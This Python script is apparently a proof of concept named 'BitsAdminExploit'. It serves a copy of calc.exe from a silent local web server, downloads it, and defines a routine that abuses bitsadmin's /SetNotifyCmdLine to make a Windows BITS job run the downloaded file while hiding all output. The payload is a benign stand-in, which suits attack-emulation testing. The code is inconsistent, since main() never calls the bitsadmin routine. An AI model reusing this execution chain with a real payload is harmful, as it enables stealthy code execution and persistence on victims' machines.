import os
import sys
import urllib.request
import shutil
import time
import threading
import subprocess
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# Configuration
HOST = "127.0.0.1"
PORT = 8000
WORK_DIR = r"C:\Temp\BitsAdminExploit"
PAYLOAD_SOURCE = r"C:\Windows\System32\calc.exe"
PAYLOAD_NAME = "calc.exe"
DOWNLOADED_NAME = "downloaded.exe"
JOB_NAME = "1"

class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        pass
    
    def log_message(self, format, *args):
        pass

def setup_environment():
    try:
        os.makedirs(WORK_DIR, exist_ok=True)
        payload_dest = os.path.join(WORK_DIR, PAYLOAD_NAME)
        if not os.path.exists(payload_dest):
            shutil.copy(PAYLOAD_SOURCE, payload_dest)
        return True
    except Exception:
        return False

def start_http_server():
    os.chdir(WORK_DIR)
    with TCPServer((HOST, PORT), SilentHTTPRequestHandler) as httpd:
        httpd.serve_forever()

def download_file():
    downloaded_path = os.path.join(WORK_DIR, DOWNLOADED_NAME)
    url = f"http://{HOST}:{PORT}/{PAYLOAD_NAME}"
    
    try:
        urllib.request.urlretrieve(url, downloaded_path)
        return os.path.exists(downloaded_path)
    except Exception:
        return False

def execute_with_bitsadmin():
    downloaded_path = os.path.join(WORK_DIR, DOWNLOADED_NAME)
    
    try:
        creation = subprocess.run(
            f'bitsadmin /create {JOB_NAME}',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if creation.returncode != 0:
            return False
            
        addfile = subprocess.run(
            f'bitsadmin /addfile {JOB_NAME} "{downloaded_path}" "{downloaded_path}"',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if addfile.returncode != 0:
            return False
            
        notify = subprocess.run(
            f'bitsadmin /SetNotifyCmdLine {JOB_NAME} "{downloaded_path}" NULL',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if notify.returncode != 0:
            return False
            
        resume = subprocess.run(
            f'bitsadmin /RESUME {JOB_NAME}',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if resume.returncode != 0:
            return False
            
        reset = subprocess.run(
            'bitsadmin /Reset',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return reset.returncode == 0
        
    except Exception:
        return False

def cleanup():
    try:
        os.remove(os.path.join(WORK_DIR, DOWNLOADED_NAME))
    except Exception:
        pass

def main():
    if not setup_environment():
        sys.exit(1)
    
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()
    time.sleep(1)
    
    if not download_file():
        cleanup()
        sys.exit(1)
    
    cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup()